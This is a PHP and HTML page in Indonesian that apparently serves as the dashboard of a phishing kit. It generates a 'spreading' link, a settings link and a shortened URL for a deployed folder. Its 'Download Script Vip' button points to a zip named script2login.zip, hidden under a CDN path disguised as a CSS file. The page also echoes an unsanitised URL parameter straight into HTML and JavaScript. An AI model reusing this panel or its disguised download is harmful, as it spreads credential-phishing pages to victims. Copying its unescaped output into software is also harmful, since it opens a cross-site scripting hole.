<?php
$time = date('d-m-Y');
include 'AlexShortLink.php';
$subdomain = $_GET['folder'];
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$shortenedURL = shortenURL($longURL);
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content=
  "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <title>Setting Otomatis | Owner Codx</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm', monospace;
    }
    body {
      background: #dbe9f4;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start; /* Align items to the top */
      padding: 40px 20px; /* Increased padding to push the content lower */
      height: 100vh; /* Full height of the viewport */
    }
    .gateway {
      background: #cbd5e1;
      border: 4px solid #000;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 8px 8px 0 #111;
      max-width: 500px;
      width: 90%;
      margin-top: 50px; /* Additional margin to push content down */
    }
    .source {
      background: #25D366;
      color: #000;
      font-weight: bold;
      padding: 6px 14px;
      border-radius: 8px;
      border: 2px solid #000;
      position: absolute;
      right: 20px;
      top: 20px;
      box-shadow: 4px 4px 0 #111;
    }
    label {
      display: block;
      margin-bottom: 15px;
      font-size: 16px;
    }
    input {
      width: 100%;
      padding: 10px;
      border: 2px solid #000;
      border-radius: 8px;
      background: #94a3b8;
      box-shadow: 4px 4px 0 #222;
      margin-top: 5px;
    }
    button {
      width: 100%;
      background: #faae2b;
      border: 2px solid #000;
      border-radius: 8px;
      padding: 10px;
      margin-top: 10px;
      font-size: 16px;
      box-shadow: 4px 4px 0 #222;
      cursor: pointer;
    }
    footer {
      margin-top: 30px;
      font-size: 14px;
    }
    footer a {
      text-decoration: none;
      color: blue;
      font-weight: bold;
      margin: 0 5px;
    }

    /* Toast notification */
    .toast {
      visibility: hidden;
      min-width: 250px;
      background-color: #4BB543;
      color: white;
      text-align: center;
      border-radius: 8px;
      padding: 16px;
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 10000;
      font-size: 14px;
      box-shadow: 0.3rem 0.3rem 0 #222;
      transition: visibility 0s, opacity 0.5s ease-in-out;
      opacity: 0;
    }
    .toast.show {
      visibility: visible;
      opacity: 1;
    }
  </style>
</head>
<body>
  <div class="gateway">
      <div onclick="toggleSource()" class="source">Download Script Vip</div><label>LINK NEBAR <input type="text" readonly value=
    "https://<?= $_SERVER['SERVER_NAME'] ?>/<?php echo $_GET['folder']; ?>">
    </label> <label>LINK SETTING <input type="text" readonly value=
    "https://<?= $_SERVER['SERVER_NAME'] ?>/<?php echo $_GET['folder']; ?>/AlexHostX.php">
    </label> <label>LINK SHORTENED <input type="text" readonly
    value="<?= $shortenedURL ?>"></label> <button onclick=
    "copyToClipboard()">Salin</button> <button onclick=
    "openLink()">Buka</button> <button onclick=
    "bukaSetting()">Setting</button>
  </div>
  <div id="toast" class="toast">
    Link berhasil disalin!
  </div>
  <footer>
    Dibuat oleh <a href="https://wa.me/6289509551861">LUKY NESIA</a> dengan ❤️
  </footer>
  <script>
  function showToast(message) {
  const toast = document.getElementById("toast");
  toast.textContent = message;
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
  }, 3000);
  }

  function copyToClipboard() {
  const url = "<?= $shortenedURL ?>";
  navigator.clipboard.writeText(url)
    .then(() => showToast("Link berhasil dibungkus, dan sudah berhasil disalin!"))
    .catch(() => showToast("Gagal menyalin link."));
  }

function openLink() {
        window.location.href = "<?php echo $_GET['folder']; ?>";
    }

  function bukaSetting() {
  window.location.href = "<?php echo $_GET['folder']; ?>/AlexHostX.php";
  }
  function toggleSource() {
      window.location = 'https://cdn.jsdelivr.net/gh/unpkgcom/assets@main/libs/style/main.css/script2login.zip';
      }
  </script>
</body>
</html>